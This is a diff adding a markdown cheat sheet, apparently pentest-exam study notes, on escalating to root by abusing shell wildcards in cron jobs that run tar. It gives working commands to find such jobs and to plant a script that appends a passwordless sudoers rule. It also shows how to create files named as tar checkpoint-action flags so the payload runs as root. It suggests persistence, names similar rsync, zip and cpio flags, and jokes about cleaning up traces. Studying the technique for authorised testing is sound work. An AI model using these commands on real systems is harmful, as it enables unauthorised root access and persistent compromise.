@@ -1,0 +1,70 @@
+✅ Summary
+Wildcard characters like *, ?, and [ ] are interpreted by the shell, not the command itself. This means you can inject options and flags into programs — especially when the command uses * to operate on files — and those file names can actually be malicious command-line arguments.
+
+The classic abuse: tar + cron + wildcards = root.
+
+🔀 "If This, Then That" Workflow
+Got This	Then Do That
+Found a cron job or script using * with a vulnerable binary (like tar, rsync, etc.)	Try injecting options/flags as file names
+The binary has an argument that allows command execution (--checkpoint-action, --use-compress-program, etc.)	Abuse it with a crafted filename
+You can write files in the working directory of the cron job	Drop payloads with filenames like --checkpoint=1 and --checkpoint-action=exec=sh root.sh
+You want to persist or escalate	Write echo '<sudo rule>' >> /etc/sudoers into your payload
+Got root?	Clean up after your shellshock forensics-style 😉
+🧠 Patterns / What to Look For
+Cron jobs using wildcards: tar -cf backup.tar.gz *
+
+SUID or root-owned scripts that use * or ? in command line
+
+Binaries that allow execution of commands with flags (--checkpoint-action=exec=sh for tar)
+
+Check man pages of commands being used with * for exploitable flags
+
+Writable directories where these jobs run — can you create arbitrary files?
+
+🛠️ One-Liners & Execution
+🔍 Find tar jobs with wildcard
+bash
+Copy
+Edit
+grep tar /etc/crontab /etc/cron.*/* 2>/dev/null
+🧪 Drop the exploit files
+bash
+Copy
+Edit
+echo 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > root.sh
+echo '' > "--checkpoint=1"
+echo '' > "--checkpoint-action=exec=sh root.sh"
+As soon as that cron job runs, it'll interpret the wildcards like this:
+
+bash
+Copy
+Edit
+tar -zcf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh
+Which means: command execution as root.
+
+💥 Hints / Gotchas / CPTS Tips
+This works because * expands to the file names in the dir → if one of those is a flag, it’s passed to the command
+
+Abuse works best when:
+
+You control the working dir (e.g., /home/youruser)
+
+You control filenames
+
+The cron job is run as root
+
+Test this locally before pushing full root.sh — try a POC like:
+
+bash
+Copy
+Edit
+echo 'touch /tmp/pwned' > root.sh
+Always check man pages of commands used with * in cron — look for:
+
+tar: --checkpoint-action
+
+rsync: --rsync-path
+
+zip, scp, cpio: similar attack surface
+
+Bonus: Wildcard injection works on more than just tar — if a script runs mybinary *, and * includes a file like --badflag, the command might misbehave.
